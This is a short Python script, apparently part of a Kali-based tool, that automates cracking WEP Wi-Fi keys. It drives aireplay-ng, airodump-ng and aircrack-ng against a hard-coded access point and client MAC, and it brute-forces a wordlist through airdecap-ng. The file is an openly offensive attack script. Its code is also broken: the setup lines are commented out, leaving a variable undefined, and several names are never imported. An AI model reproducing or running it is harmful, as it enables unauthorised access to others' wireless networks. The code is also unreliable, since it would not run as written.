import subprocess as sb
import os
import time

def attack_wep(): 

    # directory = '/home/kali/Viper/results'
    # interface = 'wlan0'
    # ap_mac_address = '70:72:3C:C5:55:F3'
    # channel = '6'
    # c_mac = 'D0:37:45:7B:1F:85'
    # pcapfilewep=os.path.join(directory,'wepcracking')

    # sb.run(['iwconfig', interface, 'channel', channel])
    # try:
    #     first_command_wep = sb.run(['aireplay-ng','-3','-b',ap_mac_address,'-h',c_mac, interface], timeout=15)
    # except sb.TimeoutExpired:
    #     pass

    # try:
    #     second_command_wep= sb.run(['airodump-ng','--bssid',ap_mac_address,'--channel',channel, '--write', pcapfilewep, interface],shell=True)
    # except sb.TimeoutExpired:
    #     pass

    # time.sleep(30)
    sb.run(['/home/kali/Viper/test.sh'])
    third_command_wep=sb.run(['aircrack-ng',f'{pcapfilewep}-01.cap'],capture_output=True,text=True)
    print(third_command_wep.stdout)

def wep_crack_no_ivs():

    lst = open('/usr/share/wordlists/ok.lst' , 'r') 
    for line in lst:
        word=re.sub(r'\W+', '', line) 	
        word.isalpha()          
        word=word.encode('utf-8').hex()                        
        p = Popen(['airdecap-ng', '-w', word, '/home/kali/Viper/results/pcapfile-02.cap'] , stdout=PIPE)
        output = p.stdout.read().decode().split('\n')
        for i in output:
            if 'Number of decrypted WEP  packets' in i:
                if int(i.split(' ')[-1]) > 0:
                    print(f'The WEP key is {line}')